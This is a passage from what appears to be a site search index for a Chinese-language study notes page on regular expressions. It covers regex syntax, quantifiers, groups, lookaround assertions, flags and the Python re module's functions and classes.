\u6a21\u5757\u63d0\u4f9b\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u76f8\u5173\u65b9\u6cd5\uff1a re.match(pattern, string, flags=0)\uff1a\u4f7f\u7528 pattern \u4ece\u5934 \u5339\u914d string\uff0cflags \u4e3a\u4fee\u9970\u7b26\u3002 \u5339\u914d\u5931\u8d25\u8fd4\u56de None\uff0c\u5339\u914d\u6210\u529f\u8fd4\u56de\u4e00\u4e2a re.Match re.search(pattern, string, flags=0)\uff1a\u4f7f\u7528 pattern \u626b\u63cf\u6574\u4e2a string\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u7684 re.Match re.sub(pattern, repl, string, count=0, flags=0)\uff1a pattern\uff1a\u8981\u88ab\u66ff\u6362\u90e8\u5206\u7684\u6b63\u5219\u8868\u8fbe\u5f0f repl\uff1a\u66ff\u6362\u7684\u5b57\u7b26\u4e32\uff0c\u6216\u8005\u66ff\u6362\u7528\u7684\u51fd\u6570 \u662f\u51fd\u6570\u65f6\u63a5\u53d7\u4e00\u4e2a re.Match\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32 string\uff1a\u539f\u5b57\u7b26\u4e32 count\uff1a\u66ff\u6362\u7684\u6700\u5927\u6b21\u6570\uff0c\u662f 0 \u65f6\u8868\u793a\u66ff\u6362\u5168\u90e8 flags\uff1a\u4fee\u9970\u7b26 re.compile(pattern, flags=0)\uff1a\u7f16\u8bd1\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8fd4\u56de\u4e00\u4e2a re.Pattern re.findall(pattern, string, flags=0)\uff1a\u5728 string \u4e2d\u67e5\u627e\u6240\u6709\u5339\u914d pattern \u7684\u7ed3\u679c\uff0c\u8fd4\u56de\u5217\u8868 re.finditer(pattern, string, flags=0)\uff1a\u5728 string \u4e2d\u67e5\u627e\u6240\u6709\u5339\u914d pattern \u7684\u90e8\u5206\uff0c\u8fd4\u56de\u8fed\u4ee3\u5668 re.split(pattern, string, maxsplit=0, flags=0)\uff1a pattern\uff1a\u8981\u4fdd\u7559\u90e8\u5206\u7684\u6b63\u5219\u8868\u8fbe\u5f0f string\uff1a\u539f\u5b57\u7b26\u4e32 maxsplit\uff1a\u5206\u9694\u6b21\u6570\uff0c\u662f 0 \u662f\u5168\u90e8\u5206\u9694 flags\uff1a\u4fee\u9970\u7b26 \u8fd4\u56de\u4e00\u4e2a\u5206\u5272\u540e\u7684\u5217\u8868 re.escape(pattern)\uff1a\u8f6c\u4e49 pattern \u4e2d\u7684\u7279\u6b8a\u5b57\u7b26 re.Pattern \u00b6 \u7528\u6cd5\u7c7b\u4f3c\u76f4\u63a5\u4f7f\u7528 re\uff0c\u53ea\u662f\u8fdb\u884c\u4e86\u9884\u7f16\u8bd1\uff0c\u5e76\u4e14\u56fa\u5b9a\u4e86 pattern \u548c flags Pattern.search(string[, pos[, endpos]]) Pattern.match(string[, pos[, endpos]]) Pattern.fullmatch(string[, pos[, endpos]]) Pattern.split(string, maxsplit=0) Pattern.findall(string[, pos[, endpos]]) Pattern.finditer(string[, pos[, endpos]]) Pattern.sub(repl, string, count=0) Pattern.pattern\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f Pattern.flags\uff1a\u4fee\u9970\u7b26 Pattern.groups\uff1aint \u503c\uff0cpattern \u4e2d\u6355\u83b7\u7ec4\u7684\u4e2a\u6570 Pattern.groupindex\uff1a\u4e00\u4e2a\u5b57\u5178\uff0c\u5982\u679c pattern \u4e2d\u5305\u542b (?P<name>...) \u5219\u5305\u542b\u4e00\u4e2a\u4ece name \u6620\u5c04\u5230\u6355\u83b7\u7ec4\u7f16\u53f7\u7684\u952e\u503c\u5bf9 re.Match \u00b6 re.Match \u662f match \u548c search \u5728\u6210\u529f\u5339\u914d\u65f6\u8fd4\u56de\u7684\u7c7b\u578b Match.group([group])\uff1a\u8fd4\u56de\u5b57\u7b26\u4e32 group() \u6216 group(0) \u8fd4\u56de\u5339\u914d\u7684\u5b8c\u6574\u5b57\u7b26\u4e32 group(i) \u8fd4\u56de\u7b2c i \u4e2a\u6355\u83b7\u7ec4 Match.start([group])\uff1aMatch.group([group]) \u5728\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u5b50\u4e32\u7b2c\u4e00\u4e2a\u5b57\u7b26\u7684\u7d22\u5f15\uff09 Match.end([group])\uff1aMatch.group([group]) \u5728\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u7ed3\u675f\u4f4d\u7f6e\uff08\u5b50\u4e32\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u7d22\u5f15+1\uff09 Match.span([group])\uff1a\u8fd4\u56de (Match.start([group]), Match.end([group])) Match.__gettiem__([group])\uff1a\u7b49\u540c\u4e8e .group([group]) \u989d\u5916\u8bed\u6cd5 \u00b6 (?#...)\uff1a\u6ce8\u91ca\uff0c\u76f4\u63a5\u5ffd\u7565 (?P ...)\uff1a\u4e3a\u6355\u83b7\u7ec4\u547d\u540d\u4e3a name\uff08\u5fc5\u987b\u662f\u5408\u6cd5 python \u53d8\u91cf\u540d\uff0c\u5e76\u4e14\u540c\u4e00\u4e2a pattern \u4e2d\u4e0d\u80fd\u91cd\u590d\uff09\uff0c\u540e\u9762\u53ef\u4ee5\u901a\u8fc7 name \u5f15\u7528\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7f16\u53f7\u5f15\u7528\u3002\u5728 Match.group([group]) \u7684 group \u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 \"name\" \u6765\u83b7\u53d6\u8fd9\u4e2a\u6355\u83b7\u7ec4 (?P=name)\uff1a\u4e0e\u540d\u5b57\u4e3a name \u7684\u6355\u83b7\u7ec4\u5b8c\u5168\u76f8\u540c\u7684\u90e8\u5206\uff0c\u76f8\u5f53\u4e8e\u901a\u8fc7\u7f16\u53f7\u5f15\u7528 (?(id/name)yes-pattern|no-pattern)\uff1a\u5982\u679c\u7f16\u53f7\u4e3a id \u6216\u8005\u540d\u5b57\u4e3a name \u7684\u6355\u83b7\u7ec4\u5b58\u5728\uff0c\u5219\u6b64\u5904\u4f7f\u7528 yes-pattern\uff0c\u5426\u5219\u4f7f\u7528 no-pattern \u4f8b\u5982\uff1a (<)?(\\w+@\\w+(?:\\.\\w+)+)(?(1)>|$) \u5339\u914d '<user@host.com>' \u548c 'user@host.com' \uff0c\u4f46\u4e0d\u5339\u914d '<user@host.com' \u548c 'user@host.com>' \u6807\u8bc6\u7b26 \u00b6 \u6807\u8bc6\u7b26 \u542b\u4e49 re.I \u5ffd\u7565\u5927\u5c0f\u5199 re.L \u672c\u5730\u5316\u8bc6\u522b\u5339\u914d\uff08\u4e0d\u53ef\u9760\uff09 re.M \u591a\u884c\u5339\u914d re.S \u5355\u884c\u5339\u914d\uff0c\u4f7f . \u540c\u6837\u5339\u914d\u6362\u884c\u7b26 re.U \u4f7f\u7528 unicode\uff0c\u5f71\u54cd \\w\\W\\b\\B re.X \u4f7f\u7528 python \u4e00\u6837\u7684\u6ce8\u91ca\uff0c\u5e76\u4e14\u6709\u591a\u884c pattern \u7684\u4f18\u5316\uff0c\u4f7f\u6b63\u5219\u66f4\u6613\u8bfb \u540c\u65f6\u4f7f\u7528\u591a\u4e2a\u6807\u8bc6\u7b26\uff0c\u7528 | \u9694\u5f00\uff08\u5982 re.I | re.M \u8868\u793a\u591a\u884c\u4e14\u5ffd\u7565\u5927\u5c0f\u5199\uff09 re.X \u7684\u4f8b\u5b50 a = re . compile ( r \"\"\"\\d + # the integral part \\. # the decimal point \\d * # some fractional digits\"\"\" , re . X ) b = re . compile ( r \"\\d+\\.\\d*\" ) a b \u7b49\u4ef7","title":"\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"cs/regex/#_1","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\uff08Regular Expression\uff09\u4f7f\u7528\u5355\u4e2a\u5b57\u7b26\u4e32\u6765\u63cf\u8ff0\u3001\u5339\u914d\u4e00\u7cfb\u5217\u5339\u914d\u67d0\u4e2a\u53e5\u6cd5\u89c4\u5219\u7684\u5b57\u7b26\u4e32\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 Abstract \u6b63\u5219\u8868\u8fbe\u5f0f\u7528\u9014\u5e7f\u6cdb\uff0c\u800c\u4e14\u529f\u80fd\u5f3a\u5927\u53c8\u597d\u7528\u3002\u53ef\u4ee5\u8bf4\u65e2\u7b80\u5355\u53c8\u7e41\u7410\uff0c\u4f46\u662f\u7528\u8d77\u6765\u5f88\u723d \u4e00\u4e9b\u5de5\u5177\uff1a RegExr \u6b63\u5219\u5728\u7ebf\u6d4b\u8bd5\u5de5\u5177 Regulex \u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u89c6\u5316 HackerRank regex \u4e60\u9898\u96c6","title":"\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"cs/regex/#_2","text":"","title":"\u8bed\u6cd5"},{"location":"cs/regex/#_3","text":"\u6240\u6709\u4e0d\u662f\u5143\u5b57\u7b26\u7684\u5b57\u7b26\u90fd\u53ef\u4ee5\u76f4\u63a5\u5199\u51fa\u6765\u7528\u6765\u5339\u914d\uff0c\u6bd4\u5982\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7b26\u53f7\u7b49 \u6709\u8bed\u6cd5\u610f\u4e49\u7684\u5b57\u7b26\u9700\u8981\u4f7f\u7528 \u8f6c\u4e49\uff0c\u6bd4\u5982 \\( \\) \\[ \\] \\. \u5206\u522b\u5339\u914d ()[]. \u8fd9\u4e94\u4e2a\u5b57\u7b26 \u8bed\u6cd5 \u63cf\u8ff0 [...] \u5339\u914d\u4efb\u610f\u5728 ... \u4e2d\u7684\u5b57\u7b26\uff0c\u5982 [ABC] \u5339\u914d\u6240\u6709 A B C \u5b57\u7b26 [^...] \u5339\u914d\u4efb\u610f\u4e0d\u5728 ... \u4e2d\u7684\u5b57\u7b26\uff0c\u5982 [^ABC] \u5339\u914d\u9664\u4e86 A B C \u5916\u7684\u6240\u6709\u5355\u4e2a\u5b57\u7b26 [x-y] \u6309\u7167\u987a\u5e8f\u5339\u914d\u4ece x \u5230 y \u5230\u6240\u6709\u5b57\u7b26\uff0c\u5982 [a-z] \u5339\u914d\u6240\u6709\u5c0f\u5199\u5b57\u6bcd\uff0c[A-E] \u5339\u914d A \u5230 E \u8fd9\u4e94\u4e2a\u5b57\u7b26\uff5c . \u5339\u914d\u4efb\u610f\u9664\u4e86\u6362\u884c\u7b26\u4ee5\u5916\u7684\u5b57\u7b26 \\w \u5339\u914d\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\uff0c\u76f8\u5f53\u4e8e [a-zA-Z0-9_] x|y \u5339\u914d x \u6216 y \uff0c\u4f18\u5148\u7ea7\u6700\u4f4e\uff0c\u5982 a|bcd \u5339\u914d a \u6216 bcd","title":"\u666e\u901a\u5b57\u7b26"},{"location":"cs/regex/#_4","text":"\u8bed\u6cd5 \u63cf\u8ff0 \\cx \u5339\u914d\u7531 x \u6307\u660e\u7684\u63a7\u5236\u5b57\u7b26\uff0cx \u5fc5\u987b\u5c5e\u4e8e [a-zA-Z]\uff0c\u5426\u5219 \\c \u76f4\u63a5\u89c6\u4e3a c\uff0c\u5982 \\cM \u5339\u914d Ctrl-M \u5373\u56de\u8f66\u7b26 \\f \u5339\u914d\u4e00\u4e2a\u6362\u9875\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0c \\cL \\n \u5339\u914d\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0a \\cJ \\r \u5339\u914d\u4e00\u4e2a\u56de\u8f66\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0d \\cM \\t \u5339\u914d\u4e00\u4e2a\u5236\u8868\u7b26\uff0c\u76f8\u5f53\u4e8e \\x09 \\cI \\v \u5339\u914d\u4e00\u4e2a\u5782\u76f4\u5236\u8868\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0b \\cK \\s \u5339\u914d\u4efb\u4f55\u7a7a\u767d\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e [ \\f\\n\\r\\t\\v]\uff0cunicode \u4e0b\u4e5f\u4f1a\u5339\u914d\u5168\u89d2\u7a7a\u683c\u7b26 \\S \u5339\u914d\u4efb\u4f55\u975e\u7a7a\u767d\u7b26\uff0c\u76f8\u5f53\u4e8e [^ \\f\\n\\r\\t\\v]","title":"\u975e\u6253\u5370\u5b57\u7b26"},{"location":"cs/regex/#_5","text":"\u7528\u6765\u6307\u5b9a\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u51fa\u73b0\u4e86\u591a\u5c11\u6b21 \u8bed\u6cd5 \u63cf\u8ff0 {n} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u51c6\u786e\u7684 n \u6b21\uff0c\u5982 o{2} \u5339\u914d\u4e24\u4e2a\u8fde\u7eed\u7684 o {n,} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u81f3\u5c11 n \u6b21\uff0c\u5982 o{2,} \u53ef\u4ee5\u5339\u914d goooood \u4e2d\u7684\u6240\u6709 o\uff0c\u4f46\u4e0d\u5339\u914d god \u4e2d\u7684 o {n,m} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u81f3\u5c11 n \u6b21\uff0c\u81f3\u591a m \u6b21 * \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d 0 \u6b21\u6216\u591a\u6b21\uff0c\u76f8\u5f53\u4e8e {0,} + \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d 1 \u6b21\u6216\u591a\u6b21\uff0c\u76f8\u5f53\u4e8e {1,} ? \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u53ef\u6709\u53ef\u65e0\uff08\u5339\u914d 0 \u6b21\u6216 1 \u6b21\uff09\uff0c\u76f8\u5f53\u4e8e {0,1}","title":"\u9650\u5b9a\u7b26"},{"location":"cs/regex/#_6","text":"* \u548c + \u7684\u5339\u914d\u90fd\u662f\u8d2a\u5a6a\u7684\uff0c\u5373\u5c3d\u53ef\u80fd\u5339\u914d\u66f4\u591a\u7684\u5b57\u7b26\uff0c\u800c\u5728\u5b83\u4eec\u540e\u9762\u52a0\u4e0a ? \u5c31\u53ef\u4ee5\u975e\u8d2a\u5a6a\uff08\u5373\u6700\u5c0f\u5339\u914d\uff09 <.*> \u4f1a\u5339\u914d\u6574\u4e2a <h1>header</h1> \u5b57\u7b26\u4e32 <.*?> \u53ea\u4f1a\u5339\u914d\u5176\u4e2d\u7684 <h1> \u548c </h1>","title":"\u8d2a\u5a6a"},{"location":"cs/regex/#_7","text":"\u53ea\u5339\u914d\u4f4d\u7f6e\uff0c\u6ca1\u6709\u5b57\u7b26\u4e0e\u4e4b\u5bf9\u5e94 \u8bed\u6cd5 \u63cf\u8ff0 ^ \u5339\u914d\u5b57\u7b26\u4e32\u5f00\u5934\uff0c\u5982\u679c\u662f\u591a\u884c\u6a21\u5f0f\uff0c\u5219\u65b0\u7684\u4e00\u884c\u4e5f\u7b97\u65b0\u7684\u5b57\u7b26\u4e32 $ \u5339\u914d\u5b57\u7b26\u4e32\u7ed3\u5c3e\uff0c\u591a\u884c\u6a21\u5f0f\u540c\u7406\u770b\u6210\u591a\u4e2a\u5b57\u7b26\u4e32 \\b \u5339\u914d\u5355\u8bcd\u8fb9\u754c\uff0c\u5373\u5b57\u7b26\u4e0e\u7a7a\u683c\u4e2d\u95f4\u7684\u4f4d\u7f6e \\B \u5339\u914d\u975e\u5355\u8bcd\u8fb9\u754c \u5b9a\u4f4d\u7b26\u53ea\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u4e0d\u80fd\u9644\u52a0\u9650\u5236\u7b26\u6307\u5b9a\u4e2a\u6570","title":"\u5b9a\u4f4d\u7b26"},{"location":"cs/regex/#_8","text":"\u7528 () \u53ef\u4ee5\u6307\u5b9a\u5339\u914d\u4e00\u4e2a\u7ec4\uff0c\u4f7f\u7528 () \u53ef\u4ee5\u6307\u5b9a\u4e0d\u540c\u9009\u9879\uff0c\u6bcf\u4e00\u9879\u95f4\u7528 | \u5206\u9694 \u540c\u65f6 () \u4e5f\u662f\u6355\u83b7\u5206\u7ec4\uff0c\u5373\u62ec\u53f7\u5185\u5339\u914d\u7684\u5185\u5bb9\u4f1a\u88ab\u7f13\u5b58\uff0c\u5982\u679c\u8981\u907f\u514d\u8fd9\u79cd\uff0c\u9700\u8981\u4f7f\u7528 (?:) \u975e\u6355\u83b7\u5143\u6765\u8fdb\u884c\u5339\u914d","title":"\u5206\u7ec4"},{"location":"cs/regex/#_9","text":"\u88ab\u7f13\u5b58\u7684\u6355\u83b7\u5206\u7ec4\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 \\n \u518d\u6b21\u5f15\u7528\uff0c\u5176\u4e2d n \u662f 1 \u5230 2 \u4f4d\u7684\u5341\u8fdb\u5236\u6570 \u6355\u83b7\u5206\u7ec4\u7684\u7f16\u53f7\u4ece 1 \u5f00\u59cb\uff0c\u6700\u591a 99 \u4e2a\uff0c\\1 \u5373\u8868\u793a\u548c\u7b2c\u4e00\u4e2a\u5706\u62ec\u53f7\u4e2d\u5339\u914d\u7684\u7ed3\u679c\u76f8\u540c\u7684\u90e8\u5206 \u5982 (abc|def)\\1 \u5339\u914d abcabc\u3001defdef \u4f46\u4e0d\u5339\u914d abcdef\u3001defabc","title":"\u53cd\u5411\u5f15\u7528"},{"location":"cs/regex/#_10","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u5148\u884c\u65ad\u8a00\uff08lookahead\uff09\u548c\u540e\u884c\u65ad\u8a00\uff08lookbehind\uff09\uff0c\u5206\u4e3a\u56db\u79cd\u5f62\u5f0f\uff1a \u8bed\u6cd5 \u540d\u79f0 (?=pattern) \u96f6\u5bbd\u6b63\u5411\u5148\u884c\u65ad\u8a00 zero-width positive lookahead assertion (?!pattern) \u96f6\u5bbd\u8d1f\u5411\u5148\u884c\u65ad\u8a00 zero-width negative lookahead assertion (?<=pattern) \u96f6\u5bbd\u6b63\u5411\u540e\u884c\u65ad\u8a00 zero-width positive lookbehind assertion (?<!pattern) \u96f6\u5bbd\u8d1f\u5411\u540e\u884c\u65ad\u8a00 zero-width negative lookbehind assertion \u548c\u5b9a\u4f4d\u7b26\u7c7b\u4f3c\uff0c\u5b83\u53ea\u5339\u914d\u4f4d\u7f6e\uff0c\u4e0d\u5339\u914d\u5185\u5bb9\uff0c\u6240\u4ee5\u53eb\u505a\u96f6\u5bbd\uff08zero-width\uff09\uff0c\u8fd9\u4e9b\u4f4d\u7f6e\u7684\u89c4\u5219\u662f\uff1a (?=pattern)\uff1a\u5339\u914d\u540e\u9762\u53ef\u4ee5\u5339\u914d pattern \u7684\u4f4d\u7f6e (?!pattern)\uff1a\u5339\u914d\u540e\u9762\u65e0\u6cd5\u5339\u914d pattern \u7684\u4f4d\u7f6e (?<=pattern) \uff1a\u5339\u914d\u524d\u9762\u53ef\u4ee5\u5339\u914d pattern \u7684\u4f4d\u7f6e (?<!pattern)\uff1a\u5339\u914d\u524d\u9762\u65e0\u6cd5\u5339\u914d pattern \u7684\u4f4d\u7f6e \u4f8b\u5b50 \u5176\u4e2d\u540e\u884c\u65ad\u8a00\u6709\u4e9b\u8bed\u8a00\u4e0d\u652f\u6301\uff08python re \u652f\u6301\uff09","title":"\u5148\u884c\u65ad\u8a00\u548c\u540e\u884c\u65ad\u8a00"},{"location":"cs/regex/#_11","text":"\u4fee\u9970\u7b26\u4e0d\u5c5e\u4e8e\u8868\u8fbe\u5f0f\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u6307\u5b9a\u4e86\u5339\u914d\u7684\u89c4\u5219\uff0cjs \u4e2d\u7684\u6b63\u5219\u5199\u6cd5\u4e3a /pattern/flags \u5176\u4e2d flags \u5c31\u662f\u4fee\u9970\u7b26 \u4fee\u9970\u7b26 \u540d\u79f0 \u542b\u4e49 i ignore \u5ffd\u7565\u5927\u5c0f\u5199 g global \u5168\u5c40\u5339\u914d\uff0c\u67e5\u627e\u6240\u6709\u5339\u914d\u9879 m multi-line \u591a\u884c\u5339\u914d\uff0c\u4f7f ^$ \u5339\u914d\u6bcf\u884c\u7684\u5f00\u5934\u548c\u7ed3\u5c3e s single-line \u5355\u884c\u5339\u914d\uff0c\u53ea\u89c6\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c. \u4e5f\u53ef\u4ee5\u5339\u914d\u6362\u884c\u7b26 \u4e0d\u540c\u8bed\u8a00\u4e2d\u5199\u6cd5\u548c\u79cd\u7c7b\u4e0d\u540c","title":"\u4fee\u9970\u7b26"},{"location":"cs/regex/#_12","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\u4e5f\u6709\u4f18\u5148\u7ea7\uff0c\u540c\u4e00\u4f18\u5148\u7ea7\u5219\u4ece\u5de6\u5411\u53f3\u8fd0\u7b97\uff0c\u4e0d\u540c\u4f18\u5148\u7ea7\u5219\u4ece\u9ad8\u5230\u4f4e\u3002\u4ece\u9ad8\u5230\u4f4e\uff1a \u8f6c\u4e49\u7b26 \\ \u62ec\u53f7\u7b26 (...) (?:...) (?=...) (?!...) (?<=...) (?<!...) [...] [^...] \u9650\u5b9a\u7b26 * + ? {n} {n,} {n,m} \u5b9a\u4f4d\u7b26 ^ $ \u5b57\u7b26 \u6216 |","title":"\u4f18\u5148\u7ea7"},{"location":"cs/regex/#python-re","text":"python \u7684 re \u6a21\u5757\u63d0\u4f9b\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u76f8\u5173\u65b9\u6cd5\uff1a re.match(pattern, string, flags=0)\uff1a\u4f7f\u7528 pattern \u4ece\u5934 \u5339\u914d string\uff0cflags \u4e3a\u4fee\u9970\u7b26\u3002 \u5339\u914d\u5931\u8d25\u8fd4\u56de None\uff0c\u5339\u914d\u6210\u529f\u8fd4\u56de\u4e00\u4e2a re.Match re.search(pattern, string, flags=0)\uff1a\u4f7f\u7528 pattern \u626b\u63cf\u6574\u4e2a string\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u7684 re.Match re.sub(pattern, repl, string, count=0, flags=0)\uff1a pattern\uff1a\u8981\u88ab\u66ff\u6362\u90e8\u5206\u7684\u6b63\u5219\u8868\u8fbe\u5f0f repl\uff1a\u66ff\u6362\u7684\u5b57\u7b26\u4e32\uff0c\u6216\u8005\u66ff\u6362\u7528\u7684\u51fd\u6570 \u662f\u51fd\u6570\u65f6\u63a5\u53d7\u4e00\u4e2a re.Match\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32 string\uff1a\u539f\u5b57\u7b26\u4e32 count\uff1a\u66ff\u6362\u7684\u6700\u5927\u6b21\u6570\uff0c\u662f 0 \u65f6\u8868\u793a\u66ff\u6362\u5168\u90e8 flags\uff1a\u4fee\u9970\u7b26 re.compile(pattern, flags=0)\uff1a\u7f16\u8bd1\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8fd4\u56de\u4e00\u4e2a re.Pattern re.findall(pattern, string, flags=0)\uff1a\u5728 string \u4e2d\u67e5\u627e\u6240\u6709\u5339\u914d pattern \u7684\u7ed3\u679c\uff0c\u8fd4\u56de\u5217\u8868 re.finditer(pattern, string, flags=0)\uff1a\u5728 string \u4e2d\u67e5\u627e\u6240\u6709\u5339\u914d pattern \u7684\u90e8\u5206\uff0c\u8fd4\u56de\u8fed\u4ee3\u5668 re.split(pattern, string, maxsplit=0, flags=0)\uff1a pattern\uff1a\u8981\u4fdd\u7559\u90e8\u5206\u7684\u6b63\u5219\u8868\u8fbe\u5f0f string\uff1a\u539f\u5b57\u7b26\u4e32 maxsplit\uff1a\u5206\u9694\u6b21\u6570\uff0c\u662f 0 \u662f\u5168\u90e8\u5206\u9694 flags\uff1a\u4fee\u9970\u7b26 \u8fd4\u56de\u4e00\u4e2a\u5206\u5272\u540e\u7684\u5217\u8868 re.escape(pattern)\uff1a\u8f6c\u4e49 pattern \u4e2d\u7684\u7279\u6b8a\u5b57\u7b26","title":"Python re \u6a21\u5757"},{"location":"cs/regex/#repattern","text":"\u7528\u6cd5\u7c7b\u4f3c\u76f4\u63a5\u4f7f\u7528 re\uff0c\u53ea\u662f\u8fdb\u884c\u4e86\u9884\u7f16\u8bd1\uff0c\u5e76\u4e14\u56fa\u5b9a\u4e86 pattern \u548c flags Pattern.search(string[, pos[, endpos]]) Pattern.match(string[, pos[, endpos]]) Pattern.fullmatch(string[, pos[, endpos]]) Pattern.split(string, maxsplit=0) Pattern.findall(string[, pos[, endpos]]) Pattern.finditer(string[, pos[, endpos]]) Pattern.sub(repl, string, count=0) Pattern.pattern\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f Pattern.flags\uff1a\u4fee\u9970\u7b26 Pattern.groups\uff1aint \u503c\uff0cpattern \u4e2d\u6355\u83b7\u7ec4\u7684\u4e2a\u6570 Pattern.groupindex\uff1a\u4e00\u4e2a\u5b57\u5178\uff0c\u5982\u679c pattern \u4e2d\u5305\u542b (?P<name>...) \u5219\u5305\u542b\u4e00\u4e2a\u4ece name \u6620\u5c04\u5230\u6355\u83b7\u7ec4\u7f16\u53f7\u7684\u952e\u503c\u5bf9","title":"re.Pattern"},{"location":"cs/regex/#rematch","text":"re.Match \u662f match \u548c search \u5728\u6210\u529f\u5339\u914d\u65f6\u8fd4\u56de\u7684\u7c7b\u578b Match.group([group])\uff1a\u8fd4\u56de\u5b57\u7b26\u4e32 group() \u6216 group(0) \u8fd4\u56de\u5339\u914d\u7684\u5b8c\u6574\u5b57\u7b26\u4e32 group(i) \u8fd4\u56de\u7b2c i \u4e2a\u6355\u83b7\u7ec4 Match.start([group])\uff1aMatch.group([group]) \u5728\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u5b50\u4e32\u7b2c\u4e00\u4e2a\u5b57\u7b26\u7684\u7d22\u5f15\uff09 Match.end([group])\uff1aMatch.group([group]) \u5728\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u7ed3\u675f\u4f4d\u7f6e\uff08\u5b50\u4e32\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u7d22\u5f15+1\uff09 Match.span([group])\uff1a\u8fd4\u56de (Match.start([group]), Match.end([group])) Match.__gettiem__([group])\uff1a\u7b49\u540c\u4e8e .group([group])","title":"re.Match"},{"location":"cs/regex/#_13","text":"(?#...)\uff1a\u6ce8\u91ca\uff0c\u76f4\u63a5\u5ffd\u7565 (?P ...)\uff1a\u4e3a\u6355\u83b7\u7ec4\u547d\u540d\u4e3a name\uff08\u5fc5\u987b\u662f\u5408\u6cd5 python \u53d8\u91cf\u540d\uff0c\u5e76\u4e14\u540c\u4e00\u4e2a pattern \u4e2d\u4e0d\u80fd\u91cd\u590d\uff09\uff0c\u540e\u9762\u53ef\u4ee5\u901a\u8fc7 name \u5f15\u7528\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7f16\u53f7\u5f15\u7528\u3002\u5728 Match.group([group]) \u7684 group \u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 \"name\" \u6765\u83b7\u53d6\u8fd9\u4e2a\u6355\u83b7\u7ec4 (?P=name)\uff1a\u4e0e\u540d\u5b57\u4e3a name \u7684\u6355\u83b7\u7ec4\u5b8c\u5168\u76f8\u540c\u7684\u90e8\u5206\uff0c\u76f8\u5f53\u4e8e\u901a\u8fc7\u7f16\u53f7\u5f15\u7528 (?(id/name)yes-pattern|no-pattern)\uff1a\u5982\u679c\u7f16\u53f7\u4e3a id \u6216\u8005\u540d\u5b57\u4e3a name \u7684\u6355\u83b7\u7ec4\u5b58\u5728\uff0c\u5219\u6b64\u5904\u4f7f\u7528 yes-pattern\uff0c\u5426\u5219\u4f7f\u7528 no-pattern \u4f8b\u5982\uff1a (<)?(\\w+@\\w+(?:\\.\\w+)+)(?(1)>|$) \u5339\u914d '<user@host.com>' \u548c 'user@host.com' \uff0c\u4f46\u4e0d\u5339\u914d '<user@host.com' \u548c 'user@host.com>'","title":"\u989d\u5916\u8bed\u6cd5"},{"location":"cs/regex/#_14","text":"\u6807\u8bc6\u7b26 \u542b\u4e49 re.I \u5ffd\u7565\u5927\u5c0f\u5199 re.L \u672c\u5730\u5316\u8bc6\u522b\u5339\u914d\uff08\u4e0d\u53ef\u9760\uff09 re.M \u591a\u884c\u5339\u914d re.S \u5355\u884c\u5339\u914d\uff0c\u4f7f . \u540c\u6837\u5339\u914d\u6362\u884c\u7b26 re.U \u4f7f\u7528 unicode\uff0c\u5f71\u54cd \\w\\W\\b\\B re.X \u4f7f\u7528 python \u4e00\u6837\u7684\u6ce8\u91ca\uff0c\u5e76\u4e14\u6709\u591a\u884c pattern \u7684\u4f18\u5316\uff0c\u4f7f\u6b63\u5219\u66f4\u6613\u8bfb \u540c\u65f6\u4f7f\u7528\u591a\u4e2a\u6807\u8bc6\u7b26\uff0c\u7528 | \u9694\u5f00\uff08\u5982 re.I | re.M \u8868\u793a\u591a\u884c\u4e14\u5ffd\u7565\u5927\u5c0f\u5199\uff09 re.X \u7684\u4f8b\u5b50 a = re . compile ( r \"\"\"\\d + # the integral part \\. # the decimal point \\d * # some fractional digits\"\"\" , re . X 